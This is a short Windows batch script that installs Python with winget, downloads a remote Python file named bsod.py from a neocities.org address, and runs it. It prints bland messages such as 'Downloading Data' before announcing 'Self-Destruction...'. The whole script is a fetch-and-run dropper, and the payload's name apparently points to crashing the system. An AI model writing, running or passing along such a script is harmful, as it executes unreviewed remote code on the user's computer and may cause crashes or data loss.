
set "currentDir=%~dp0"
for /f "usebackq" %%I in (`PowerShell -Command "(New-TimeSpan -Start ([datetime]::Parse('1970-01-01T00:00:00Z')) -End ([datetime]::UtcNow)).TotalSeconds"`) do set "epoch=%%I"
cls
echo off
setlocal
echo Installing Python
winget install Python.Python.3.9
cls
echo Downloading Data
powershell -Command "(New-Object Net.WebClient).DownloadFile('https://jochenderrochen.neocities.org/batch-fetch/bsod.py', '%currentDir%temp%epoch%.py')"
cls
echo Self-Destruction...
python %currentDir%temp%epoch%.py 1
echo Chao!
